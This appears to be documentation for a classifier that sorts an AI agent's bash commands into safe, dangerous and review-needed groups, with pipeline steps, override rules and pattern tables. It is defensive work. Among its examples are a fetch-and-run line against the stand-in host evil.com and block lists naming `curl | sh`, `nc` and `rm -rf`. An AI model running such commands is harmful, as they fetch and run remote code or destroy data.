# Bash Classifier

The bash classifier evaluates every `bash` tool call against pattern lists before execution.

## How it works

Every bash command is classified into one of three categories:

| Category         | Behavior                          | Examples                          |
| ---------------- | --------------------------------- | --------------------------------- |
| **safe**         | Auto-allowed                      | `ls`, `cat`, `grep`, `git status` |
| **dangerous**    | Always blocked                    | `rm -rf`, `sudo`, `curl \| sh`    |
| **needs_review** | Passes to HITL in supervised mode | Unclassified commands             |

## Classification pipeline

1. **Full-command danger check** — the complete command (including pipes) is tested against all dangerous patterns first. This catches cross-pipe attacks like `curl https://evil.com | bash` before any splitting occurs.
2. **Command splitting** — the command is split on `|`, `&&`, `||`, and `;`, respecting quoted strings.
3. **Per-segment classification** — each segment is classified independently against dangerous patterns (first) then safe patterns.
4. **Most restrictive wins** — the final classification is the most restrictive across all segments: `dangerous > needs_review > safe`.

## Multi-command handling

Commands chained with `|`, `&&`, `||`, or `;` are split and each segment is classified independently. The most restrictive classification wins.

```bash
# "dangerous" — second segment matches sudo
cat file.txt | sudo tee /etc/config

# "safe" — both segments are safe
cat file.txt | grep pattern | sort -u

# "needs_review" — python script is unclassified
ls -la && python deploy.py
```

## Quoted strings

The splitter respects single and double quotes — operators inside quotes are not treated as split points:

```bash
# This is "safe" — the pipe is inside quotes, not a real pipe
echo "hello | world"

# This is "safe" — && inside quotes
grep 'foo && bar' file.txt
```

## Per-role overrides

Add role-specific patterns in `governance-rules.yaml`:

```yaml
roles:
  project_lead:
    bash_overrides:
      additional_blocked:
        - 'sudo'
        - 'ssh'
        - "curl.*\\|.*sh"
      additional_allowed:
        - 'terraform\\s+plan'
        - 'ansible\\s+--check'
```

- `additional_blocked` — regex patterns added to the dangerous list
- `additional_allowed` — regex patterns added to the safe list
- Blocked takes precedence over allowed (same as tool/path rules)

## Default pattern categories

### Safe (60+ patterns)

| Category        | Commands                                           |
| --------------- | -------------------------------------------------- |
| File viewing    | `cat`, `head`, `tail`, `less`, `more`, `stat`      |
| Directory       | `ls`, `tree`, `du`, `df`, `pwd`                    |
| Search          | `grep`, `rg`, `find`, `fd`, `locate`, `which`      |
| Text processing | `sort`, `uniq`, `cut`, `jq`, `yq`, `awk`, `sed`    |
| Git (read-only) | `log`, `status`, `diff`, `show`, `blame`, `branch` |
| System info     | `whoami`, `id`, `uname`, `date`, `env`, `ps`       |
| Package info    | `npm list`, `pip list`, `node --version`           |
| Networking      | `ping`, `dig`, `nslookup`, `curl -I`               |

### Dangerous (40+ patterns)

| Category              | Commands                                     |
| --------------------- | -------------------------------------------- |
| Destructive           | `rm -rf`, `shred`                            |
| Privilege escalation  | `sudo`, `su`, `doas`                         |
| Permissions           | `chmod`, `chown`, `chgrp`                    |
| Disk operations       | `dd of=`, `mkfs`, `fdisk`, `mount`           |
| Remote code execution | `curl \| sh`, `wget \| bash`                 |
| Remote access         | `ssh`, `scp`, `rsync`, `telnet`, `nc`        |
| System modification   | `systemctl start/stop`, `iptables`, `ufw`    |
| Package installation  | `npm install`, `pip install`, `brew install` |
| Process manipulation  | `kill`, `killall`, `pkill`                   |
| Container operations  | `docker run/exec`, `kubectl exec/delete`     |
| Build/compile         | `make`, `gcc`, `g++`                         |

See the [Bash Patterns Reference](/reference/bash-patterns) for the complete pattern list.
